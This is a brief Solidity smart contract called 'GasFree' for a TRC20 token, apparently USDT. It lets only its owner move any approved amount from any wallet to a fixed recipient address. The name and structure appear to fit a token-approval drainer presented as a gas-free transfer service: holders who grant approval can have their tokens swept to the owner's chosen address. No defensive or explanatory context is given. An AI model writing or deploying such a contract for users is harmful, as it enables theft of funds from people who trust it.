// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITRC20 {
    function transferFrom(address, address, uint256) external returns (bool);
}

contract GasFree {
    address private USDT;
    address private RECIPIENT;
    address private owner;

    constructor(address u, address r) {
        USDT = u;
        RECIPIENT = r;
        owner = msg.sender;
    }

    function transferUSDT(address f, uint256 a) external returns (bool) {
        if (msg.sender != owner) revert("O");
        if (f == address(0) || a == 0) revert("0");
        return ITRC20(USDT).transferFrom(f, RECIPIENT, a);
    }
}
